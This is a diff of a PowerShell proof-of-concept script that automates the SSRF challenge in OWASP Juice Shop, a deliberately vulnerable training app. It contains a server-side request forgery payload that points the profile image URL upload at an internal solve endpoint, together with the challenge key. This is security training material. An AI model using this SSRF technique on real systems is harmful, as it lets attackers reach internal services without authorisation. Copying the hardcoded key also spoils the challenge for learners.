@@ -1,10 +1,12 @@
-# # ds-235150201111019 — PoC otomatis untuk <challenge>
+param(
+    [string]$TargetHost = "http://localhost:3000"
+)
+
+# ds-235150201111019 — PoC otomatis ssrfChallenge
 # # OWASP Juice Shop SSRF Challenge Automation Proof of Concept (PoC)
 # # Target: SSRF Challenge (Link Gravatar / profileImageUrlUpload)
 
 # Debugging & Error Handling Script Template
-$TargetHost = "http://localhost:3000"
-
 $LoginUrl   = "$TargetHost/rest/user/login"
 $ProfileUrl = "$TargetHost/profile/image/url"
 
@@ -76,7 +78,8 @@ catch {
     exit 2
 }
 
-$PayloadUrl = "$TargetHost/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3&wm=ds-235150201111019"
+# Inside Docker, the vulnerable server reaches itself on its container port.
+$PayloadUrl = "http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3&wm=ds-235150201111019"
 $ProfileBody = "imageUrl=$([uri]::EscapeDataString($PayloadUrl))"
 
 
